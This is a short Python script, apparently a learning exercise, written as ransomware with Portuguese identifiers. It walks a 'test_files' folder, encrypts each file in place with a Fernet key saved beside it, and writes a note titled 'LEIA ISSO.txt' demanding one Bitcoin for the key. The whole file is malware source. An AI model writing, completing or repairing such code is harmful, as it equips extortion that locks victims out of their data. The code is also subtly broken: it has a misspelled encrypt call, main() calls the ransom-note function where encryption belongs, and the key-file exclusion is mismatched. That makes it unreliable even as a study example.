from cryptography.fernet import Fernet
import os 


def gerar_chave():
    chave =  Fernet.generate_key()
    with open("chave_key", "wb") as chave_file:
        chave_file.write(chave)


def carregar_chave():
    return open("chave_key", "rb").read()  


def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.ecrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)     

      
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista 


def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquiuvos foram criptografados!\n")
        f.write("Envie 1 Bitcoin para o endereço X e emvie o comprovante !\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")


def main():
    gerar_chave()       
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criar_mensagem_resgate(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos Criptografados!")

if __name__=="__main__":
    main()   